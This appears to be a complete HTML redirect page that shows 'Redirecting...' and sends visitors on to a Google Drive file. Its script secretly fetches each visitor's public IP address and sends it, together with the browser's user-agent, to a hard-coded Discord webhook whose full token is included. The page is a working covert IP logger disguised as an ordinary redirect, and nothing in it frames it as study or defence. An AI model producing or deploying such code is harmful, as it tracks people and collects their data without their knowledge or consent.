<!DOCTYPE html>
<html>
<head>
  <script>
    // Get IP and send to webhook
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        const webhookURL = 'https://discord.com/api/webhooks/1346201636246388856/IU6P9NLHsun4Mkln7NabkTOxX7RqL6_56tYXspYdbdRtyeIT0-uuDaUqiXgs7SdLRlIW';
        const embed = {
          title: 'New Visitor',
          description: `IP: ${data.ip}\nUser-Agent: ${navigator.userAgent}`,
          timestamp: new Date().toISOString()
        };
        
        fetch(webhookURL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ embeds: [embed] })
        });
      });
    
    // Redirect after a short delay
    setTimeout(() => {
      window.location.href = 'https://drive.google.com/file/d/1pEFnnPyHl0ug_rD9WtfYKcoy3u3EjJBX/view';
    }, 500);
  </script>
</head>
<body>
  <p>Redirecting...</p>
</body>
</html>
